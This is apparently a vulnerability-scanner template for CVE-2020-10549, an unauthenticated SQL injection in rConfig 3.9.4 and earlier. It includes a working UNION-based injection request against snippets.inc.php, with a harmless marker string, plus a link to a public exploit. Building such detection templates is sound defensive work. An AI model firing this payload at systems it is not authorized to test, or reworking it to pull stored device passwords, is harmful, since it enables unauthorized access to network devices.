id: CVE-2020-10549

info:
  name: rConfig <=3.9.4 - SQL Injection
  author: madrobot
  severity: critical
  description: rConfig 3.9.4 and prior has unauthenticated snippets.inc.php SQL injection. Because nodes' passwords are stored in cleartext by default, this vulnerability leads to lateral movement, granting an attacker access to monitored network devices.
  impact: |
    Successful exploitation of this vulnerability allows an attacker to execute arbitrary SQL queries, potentially leading to unauthorized access, data manipulation.
  remediation: |
    Upgrade rConfig to version >3.9.4 or apply the provided patch to mitigate the SQL Injection vulnerability.
  reference:
    - https://github.com/theguly/exploits/blob/master/CVE-2020-10549.py
    - https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/
    - https://nvd.nist.gov/vuln/detail/CVE-2020-10549
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-10549
    cwe-id: CWE-89
    epss-score: 0.45422
    epss-percentile: 0.97076
    cpe: cpe:2.3:a:rconfig:rconfig:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: rconfig
    product: rconfig
  tags: cve,cve2020,rconfig,sqli

http:
  - method: GET
    path:
      - "{{BaseURL}}/snippets.inc.php?search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL+--+&searchColumn=snippetName&searchOption=contains"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "[project-discovery]"

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100e5a06ce64e9eff86298184fefa02a5c506820b7c9de6aa699daf3b946b426689022100c8499d26593f59bfbf8075cf8c447872714d67a5a51cf144b9a9ca7299826936:922c64590222798bb761d5b6d8e72950